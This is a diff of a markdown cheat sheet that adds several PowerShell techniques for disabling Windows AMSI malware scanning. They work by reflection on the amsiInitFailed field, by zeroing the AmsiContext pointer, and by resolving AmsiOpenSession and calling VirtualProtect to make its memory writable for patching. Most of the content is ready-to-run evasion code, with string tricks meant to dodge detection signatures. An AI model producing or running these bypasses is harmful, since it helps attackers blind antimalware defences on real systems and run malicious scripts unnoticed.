@@ -1,26 +1,85 @@
 # Powershell 
 <br>
 
-### Disables AMSI.  Have to trick the AMSI bypass with string concatination 
+### Disables AMSI by attacking initialization 
 <br>
 
 ``` powershell
-$fields = [Ref].Assembly.GetType('System.Management'+'.Automation.Amsi'+'Utils').GetField('amsiInitFailed','NonPublic,Static')
-$fields.SetValue($null,$true)
+
+$loc = 'System.Management.Automation.AmsiUtils'
+$field = 'amsiInitFailed'
+$GT = [Ref].Assembly.GetType($loc).GetField($field,'NonPublic,Static')
+$GT.SetValue($null,$true)
 
 ```
 <br>
 
-### Disable AMSI with AmsiContext rewrite to 0000  
+### Disable AMSI by attacking AmsiContext and rewrite first 4 bytes to 0000  
 <br>
 
 ``` powershell
-$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like ("*i" + "Utils")) {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 
 ```
+<br><br>
+
+### Disable AMSI by patching internals
+
+**After performing this attack make sure to reset the memory back to its old read/execute permissions**
+
+``` powershell
+
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
+
+```
+<Br><br>
+
+``` powershell
+
+function LookupFunc {
+
+	Param ($moduleName, $functionName)
+
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('Xyxtem.dll'.Replace('X','S').Replace('x','s')) }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+		[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+
+	$type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+      DefineDynamicModule('InMemoryModule', $false).
+      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+      [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+	return $type.CreateType()
+}
 
 
+[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
 
+```
 
 
 # JSCRIPT
